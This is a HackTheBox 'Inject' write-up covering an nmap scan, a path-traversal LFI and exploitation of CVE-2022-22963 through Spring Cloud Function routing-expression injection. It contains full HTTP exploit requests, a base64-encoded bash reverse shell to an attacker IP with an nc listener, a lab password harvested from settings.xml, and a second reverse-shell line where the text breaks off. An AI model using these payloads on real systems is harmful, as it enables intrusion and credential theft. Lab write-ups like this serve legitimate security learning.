---
layout: post
title: htb inject
date: 2023-03-23 09:16 +0100
categories: [HackTheBox]
tags: [Hack-The-Box-Easy, Open-beta-season]
hidden: true
---

```
HOST: 10.10.11.204
```
## Tools used

- [nmap](https://nmap.org/)
- [burpSuite](https://portswigger.net/)

## What to do ?

- First we'll scan port with `nmap` to discover if was some it open
- Then we'll find a loophole and exploit it.

## Nmap Scan

```
┌──(rether㉿rether)-[~]
└─$ nmap -A 10.10.11.204
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.11.204
Host is up (0.052s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
1503/tcp filtered imtc-mcs
3404/tcp filtered unknown
8080/tcp open     nagios-nsca Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## TCP - Port 8080

![Inject Zodd Cloud](/assets/img/posts/inject/inject-zodd-cloud-home.png "Inject Zodd Cloud")

![Inject Zodd Cloud Upload](/assets/img/posts/inject/inject-zodd-cloud-upload.png "Inject Zodd Cloud Upload")

## Burpsuite - Local File Inclusions (LFI)

When we upload image on the server and we click on the `View your Image` we can see in the url the parameter `img`

```url
10.10.11.204:8080/show_image?img=8887086_4025692.jpeg
```

With repeater from Burpsuite we can try some basic Bypasses LFI


![Burpsuite LFI](/assets/img/posts/inject/inject-burpsuite-lfi.png "Burpsuite LFI")

With the following bypass, we can display the contents of the `/etc/passwd` file 

```
http://10.10.11.204:8080/show_image?img=../.././.././../../../../etc/passwd
```

## Get user flag

### 

In the server's web directory, we have a `pom.xml` file. This file contains information about the project and configuration details used by Maven to build a project.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

We found this vulnerability [CVE-2022-22963](https://spring.io/security/cve-2022-22963) 

With burpsuite we create a post request. To see if the vulnerability work we create a file named `success` in temporary file:

```text
POST /functionRouter HTTP/1.1
Host: 10.10.11.204:8080
Accept-Encoding: gzip, deflate
Accept: _/_
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4

test
```

![Burpsuite touch /tmp/success](/assets/img/posts/inject/inject-burpsuite-tmp-success.png "Burpsuite touch /tmp/success")

Now we can inject own payload:

```bash
┌──(rether㉿rether)-[~]
└─$ echo "bash -i >& /dev/tcp/10.10.14.13/443 0>&1" | base64   
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgMD4mMQo=
```

```
POST /functionRouter HTTP/1.1
Host: 10.10.11.204:8080
Accept-Encoding: gzip, deflate
Accept: _/_
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}")
Content-Type: text/plain
Content-Length: 4

Test
```

```bash
┌──(rether㉿rether)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.204] 56168
bash: cannot set terminal process group (823): Inappropriate ioctl for device
bash: no job control in this shell

frank@inject:/$ whoami
whoami
frank
```

### Connect to the phil user

Now we are in but we don't have the user flag. In the `/home` path we see a second user folder `phil`

```bash
frank@inject:/$ ls -al /home
ls -al /home
total 16
drwxr-xr-x  4 root  root  4096 Feb  1 18:38 .
drwxr-xr-x 18 root  root  4096 Feb  1 18:38 ..
drwxr-xr-x  5 frank frank 4096 Feb  1 18:38 frank
drwxr-xr-x  3 phil  phil  4096 Feb  1 18:38 phil
```

In the `~/.m2` folder we have a `settings.xml` file who contains the credentials ofr the phil account 

```bash
frank@inject:~$ cd .m2
cd .m2
frank@inject:~/.m2$ cat setting.xml     
cat setting.xml
cat: setting.xml: No such file or directory
frank@inject:~/.m2$ cat settings.xml
cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

```bash
frank@inject:/$ su phil
su phil
Password: DocPhillovestoInject123
whoami
phil
cd   
ls -al user.txt
-rw-r----- 1 root phil 33 May 26 09:22 user.txt
cat user.txt
[user-flag]
```

## Get root flag

In the `opt` 

```bash
ls -al /opt/automation/tasks
total 12
drwxrwxr-x 2 root staff 4096 May 26 18:54 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 May 26 18:54 playbook_1.yml
```

```bash
echo '/bin/bash -i >& /dev/tcp/10.10.14.13/445 0>&1' > /tmp/root.sh
```
